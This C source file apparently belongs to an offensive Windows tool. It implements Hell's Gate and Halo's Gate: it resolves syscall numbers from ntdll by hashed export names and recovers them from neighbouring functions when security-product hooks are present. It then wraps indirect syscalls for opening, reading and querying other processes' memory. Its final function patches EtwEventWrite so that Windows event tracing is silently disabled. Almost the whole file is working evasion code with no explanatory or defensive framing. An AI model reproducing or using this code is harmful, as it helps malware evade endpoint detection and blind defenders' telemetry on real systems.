/**
 * Hell's Gate + Halo's Gate — Dynamic SSN resolution from ntdll.dll in memory.
 *
 * Resolves syscall numbers (SSN) and the address of the `syscall` instruction
 * within ntdll.dll for indirect syscall execution.
 *
 * Technique:
 * 1. Walk the PEB to find ntdll.dll base address
 * 2. Parse ntdll's export table to find Nt* functions
 * 3. Read the SSN from the function prologue (mov eax, <SSN>)
 * 4. If hooked (jmp instead of mov), use neighbor functions (Halo's Gate)
 * 5. Find the `syscall` instruction address for indirect calls
 */

#include <windows.h>
#include "../include/ntdefs.h"
#include "../include/syscalls.h"

SYSCALL_TABLE g_ssn = {0};
SYSCALL_ADDR_TABLE g_addr = {0};

// Get ntdll base from PEB (no API calls)
static PVOID get_ntdll_base(void) {
    // PEB -> Ldr -> InMemoryOrderModuleList
    // ntdll is always the second entry (after the exe itself)
#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif
    PLIST_ENTRY list = peb->Ldr->InMemoryOrderModuleList.Flink;
    // Skip first entry (exe), second is ntdll
    list = list->Flink;
    PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(list, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    return entry->DllBase;
}

// DJB2 hash — matches compile-time constants in syscalls.h
static inline DWORD djb2_hash(const char *str) {
    DWORD hash = 5381;
    while (*str)
        hash = ((hash << 5) + hash) + (unsigned char)*str++;
    return hash;
}

// Find export by hash in a PE module (no plaintext function names)
static PVOID get_export_by_hash(PVOID module_base, DWORD target_hash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)module_base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)module_base + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE *)module_base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );

    DWORD *names = (DWORD *)((BYTE *)module_base + exports->AddressOfNames);
    WORD *ordinals = (WORD *)((BYTE *)module_base + exports->AddressOfNameOrdinals);
    DWORD *functions = (DWORD *)((BYTE *)module_base + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        const char *name = (const char *)((BYTE *)module_base + names[i]);
        if (djb2_hash(name) == target_hash) {
            return (BYTE *)module_base + functions[ordinals[i]];
        }
    }
    return NULL;
}

// Extract SSN from an Nt function's prologue
// Expected pattern: 4C 8B D1 | B8 <SSN:4 bytes> | ...
// If hooked (starts with E9/jmp), use Halo's Gate (check neighbors)
static BOOL extract_ssn(BYTE *func_addr, DWORD *ssn_out, PVOID *syscall_addr_out) {
    // Check if the function is clean (not hooked)
    // Clean pattern: 4C 8B D1 B8 xx xx 00 00
    if (func_addr[0] == 0x4C && func_addr[1] == 0x8B && func_addr[2] == 0xD1 &&
        func_addr[3] == 0xB8) {
        *ssn_out = *(DWORD *)(func_addr + 4);
        // Find the syscall instruction (0F 05) within this function
        for (int i = 0; i < 32; i++) {
            if (func_addr[i] == 0x0F && func_addr[i + 1] == 0x05) {
                *syscall_addr_out = func_addr + i;
                return TRUE;
            }
        }
        return FALSE;
    }

    // Halo's Gate: function is hooked, check neighbors
    // Look at adjacent Nt* functions (they're typically 32 bytes apart)
    for (int distance = 1; distance < 20; distance++) {
        // Check upward neighbor
        BYTE *up = func_addr - (distance * 32);
        if (up[0] == 0x4C && up[1] == 0x8B && up[2] == 0xD1 && up[3] == 0xB8) {
            *ssn_out = *(DWORD *)(up + 4) + distance;
            // Still need a syscall addr — find one in any clean neighbor
            for (int i = 0; i < 32; i++) {
                if (up[i] == 0x0F && up[i + 1] == 0x05) {
                    *syscall_addr_out = up + i;
                    return TRUE;
                }
            }
        }

        // Check downward neighbor
        BYTE *down = func_addr + (distance * 32);
        if (down[0] == 0x4C && down[1] == 0x8B && down[2] == 0xD1 && down[3] == 0xB8) {
            *ssn_out = *(DWORD *)(down + 4) - distance;
            for (int i = 0; i < 32; i++) {
                if (down[i] == 0x0F && down[i + 1] == 0x05) {
                    *syscall_addr_out = down + i;
                    return TRUE;
                }
            }
        }
    }

    return FALSE;
}

// Resolve a single syscall by hash
static BOOL resolve_one(PVOID ntdll, DWORD hash, DWORD *ssn, PVOID *addr) {
    BYTE *func = (BYTE *)get_export_by_hash(ntdll, hash);
    if (!func) return FALSE;
    return extract_ssn(func, ssn, addr);
}

BOOL resolve_syscalls(void) {
    PVOID ntdll = get_ntdll_base();
    if (!ntdll) return FALSE;

    BOOL ok = TRUE;
    ok &= resolve_one(ntdll, H_NtOpenProcess, &g_ssn.NtOpenProcess, &g_addr.NtOpenProcess);
    ok &= resolve_one(ntdll, H_NtClose, &g_ssn.NtClose, &g_addr.NtClose);
    ok &= resolve_one(ntdll, H_NtQueryVirtualMemory, &g_ssn.NtQueryVirtualMemory, &g_addr.NtQueryVirtualMemory);
    ok &= resolve_one(ntdll, H_NtReadVirtualMemory, &g_ssn.NtReadVirtualMemory, &g_addr.NtReadVirtualMemory);
    ok &= resolve_one(ntdll, H_NtQueryInformationProcess, &g_ssn.NtQueryInformationProcess, &g_addr.NtQueryInformationProcess);
    ok &= resolve_one(ntdll, H_NtCreateFile, &g_ssn.NtCreateFile, &g_addr.NtCreateFile);
    ok &= resolve_one(ntdll, H_NtWriteFile, &g_ssn.NtWriteFile, &g_addr.NtWriteFile);
    ok &= resolve_one(ntdll, H_NtQuerySystemInformation, &g_ssn.NtQuerySystemInformation, &g_addr.NtQuerySystemInformation);
    ok &= resolve_one(ntdll, H_NtProtectVirtualMemory, &g_ssn.NtProtectVirtualMemory, &g_addr.NtProtectVirtualMemory);

    return ok;
}

// Typed syscall wrappers
NTSTATUS sys_NtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
                           POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) {
    return indirect_syscall(g_ssn.NtOpenProcess, g_addr.NtOpenProcess,
                           ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
}

NTSTATUS sys_NtClose(HANDLE Handle) {
    return indirect_syscall(g_ssn.NtClose, g_addr.NtClose, Handle);
}

NTSTATUS sys_NtQueryVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
                                   DWORD MemoryInformationClass, PVOID MemoryInformation,
                                   SIZE_T MemoryInformationLength, PSIZE_T ReturnLength) {
    return indirect_syscall(g_ssn.NtQueryVirtualMemory, g_addr.NtQueryVirtualMemory,
                           ProcessHandle, BaseAddress, MemoryInformationClass,
                           MemoryInformation, MemoryInformationLength, ReturnLength);
}

NTSTATUS sys_NtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
                                  PVOID Buffer, SIZE_T NumberOfBytesToRead,
                                  PSIZE_T NumberOfBytesRead) {
    return indirect_syscall(g_ssn.NtReadVirtualMemory, g_addr.NtReadVirtualMemory,
                           ProcessHandle, BaseAddress, Buffer,
                           NumberOfBytesToRead, NumberOfBytesRead);
}

NTSTATUS sys_NtQueryInformationProcess(HANDLE ProcessHandle, DWORD ProcessInformationClass,
                                        PVOID ProcessInformation, ULONG ProcessInformationLength,
                                        PULONG ReturnLength) {
    return indirect_syscall(g_ssn.NtQueryInformationProcess, g_addr.NtQueryInformationProcess,
                           ProcessHandle, ProcessInformationClass, ProcessInformation,
                           ProcessInformationLength, ReturnLength);
}

NTSTATUS sys_NtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess,
                           POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock,
                           PLARGE_INTEGER AllocationSize, ULONG FileAttributes,
                           ULONG ShareAccess, ULONG CreateDisposition,
                           ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength) {
    return indirect_syscall(g_ssn.NtCreateFile, g_addr.NtCreateFile,
                           FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock,
                           AllocationSize, FileAttributes, ShareAccess, CreateDisposition,
                           CreateOptions, EaBuffer, EaLength);
}

NTSTATUS sys_NtWriteFile(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine,
                          PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock,
                          PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key) {
    return indirect_syscall(g_ssn.NtWriteFile, g_addr.NtWriteFile,
                           FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
                           Buffer, Length, ByteOffset, Key);
}

NTSTATUS sys_NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
                                     PSIZE_T RegionSize, ULONG NewProtect,
                                     PULONG OldProtect) {
    return indirect_syscall(g_ssn.NtProtectVirtualMemory, g_addr.NtProtectVirtualMemory,
                           ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
}

// Patch EtwEventWrite to return 0 (disable ETW tracing).
// Overwrites the first 4 bytes with: xor eax,eax; ret (33 C0 C3 CC)
BOOL patch_etw(void) {
    PVOID ntdll = get_ntdll_base();
    if (!ntdll) return FALSE;

    PVOID etw_addr = get_export_by_hash(ntdll, H_EtwEventWrite);
    if (!etw_addr) return FALSE;

    // Make the page writable
    PVOID base = etw_addr;
    SIZE_T size = 4;
    ULONG old_protect = 0;
    NTSTATUS status = sys_NtProtectVirtualMemory(
        (HANDLE)-1, &base, &size, 0x40 /*PAGE_EXECUTE_READWRITE*/, &old_protect);
    if (status != 0) return FALSE;

    // xor eax, eax; ret; int3
    BYTE patch[] = { 0x33, 0xC0, 0xC3, 0xCC };
    for (int i = 0; i < 4; i++)
        ((BYTE *)etw_addr)[i] = patch[i];

    // Restore original protection
    sys_NtProtectVirtualMemory(
        (HANDLE)-1, &base, &size, old_protect, &old_protect);

    return TRUE;
}
